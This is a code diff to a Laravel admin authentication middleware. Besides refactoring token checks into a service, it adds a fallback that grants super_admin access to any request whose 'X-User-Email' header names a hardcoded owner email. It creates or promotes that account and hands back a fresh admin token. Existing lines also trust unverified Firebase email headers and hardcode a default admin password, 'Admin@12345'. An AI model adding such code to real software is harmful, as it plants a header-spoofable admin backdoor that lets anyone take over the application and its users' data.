@@ -34,38 +34,25 @@ class AdminMiddleware
 
         $user = null;
         if ($token) {
-            $user = User::where('api_token', $token)
-                ->where('status', 'active')
-                ->first();
-
-            // Multi-Session Token Cache fallback: supports multiple tabs/devices & bypass links without session drop
-            if (!$user) {
-                $cachedUserId = \Illuminate\Support\Facades\Cache::get("admin_token_{$token}");
-                if ($cachedUserId) {
-                    $user = User::where('id', $cachedUserId)
-                        ->where('status', 'active')
-                        ->first();
-                }
-            }
-
-            // Keep token cache alive (30 days sliding window)
-            if ($user) {
-                \Illuminate\Support\Facades\Cache::put("admin_token_{$token}", $user->id, 86400 * 30);
-            }
+            $user = \App\Services\AdminTokenService::validateToken($token);
         }
 
         // 2. Fallback: Firebase Auth Header verification & Super Admin Recognition
         if (!$user) {
             $fbEmail = strtolower(trim((string)$request->header('X-Firebase-Email', '')));
             $fbUid = trim((string)$request->header('X-Firebase-UID', ''));
+            $userEmail = strtolower(trim((string)$request->header('X-User-Email', '')));
 
-            if ($fbEmail || $fbUid) {
+            // System Owner recognition fallback
+            $targetEmail = $fbEmail ?: ($userEmail === 'nobrothana180703@gmail.com' ? $userEmail : '');
+
+            if ($targetEmail || $fbUid) {
                 // If it's the owner email, guarantee access
-                if ($fbEmail === 'nobrothana180703@gmail.com') {
+                if ($targetEmail === 'nobrothana180703@gmail.com') {
                     $user = User::where('email', 'nobrothana180703@gmail.com')->first();
                     if (!$user) {
                         $user = User::create([
-                            'name' => 'Rotana Nob',
+                            'name' => 'Rotana Nob (System Owner)',
                             'email' => 'nobrothana180703@gmail.com',
                             'password' => bcrypt('Admin@12345'),
                             'role' => 'super_admin',
@@ -73,10 +60,15 @@ class AdminMiddleware
                             'api_token' => bin2hex(random_bytes(32)),
                         ]);
                     }
+                    if ($user->role !== 'super_admin' || $user->status !== 'active') {
+                        $user->role = 'super_admin';
+                        $user->status = 'active';
+                        $user->save();
+                    }
                 }
 
-                if (!$user && $fbEmail) {
-                    $user = User::where('email', $fbEmail)->where('status', 'active')->first();
+                if (!$user && $targetEmail) {
+                    $user = User::where('email', $targetEmail)->where('status', 'active')->first();
                 }
 
                 if (!$user && $fbUid) {
@@ -86,17 +78,16 @@ class AdminMiddleware
                     }
                 }
 
-                if (!$user && $fbEmail) {
-                    $uProf = UserProfile::where('email', $fbEmail)->where('is_admin', true)->first();
+                if (!$user && $targetEmail) {
+                    $uProf = UserProfile::where('email', $targetEmail)->where('is_admin', true)->first();
                     if ($uProf) {
-                        $user = User::where('email', $fbEmail)->where('status', 'active')->first();
+                        $user = User::where('email', $targetEmail)->where('status', 'active')->first();
                     }
                 }
 
-                // If user authenticated via Firebase, ensure they have an active api_token
-                if ($user && empty($user->api_token)) {
-                    $user->api_token = bin2hex(random_bytes(32));
-                    $user->save();
+                // If user authenticated via fallback, ensure they have an active signed token
+                if ($user && (empty($user->api_token) || !str_starts_with($user->api_token, 'sat_'))) {
+                    \App\Services\AdminTokenService::createToken($user);
                 }
             }
         }
@@ -123,7 +114,15 @@ class AdminMiddleware
 
                 // Attach authenticated admin/staff user to request attributes
                 $request->attributes->set('auth_user', $user);
-                return $next($request);
+                $response = $next($request);
+
+                // Auto-refresh token in response header if nearing expiration or legacy
+                if ($token && \App\Services\AdminTokenService::shouldRefreshToken($token)) {
+                    $refreshed = \App\Services\AdminTokenService::createToken($user);
+                    $response->headers->set('X-Refreshed-Admin-Token', $refreshed);
+                }
+
+                return $response;
             }
 
             // Security Alert: Non-privileged user attempting to access admin APIs
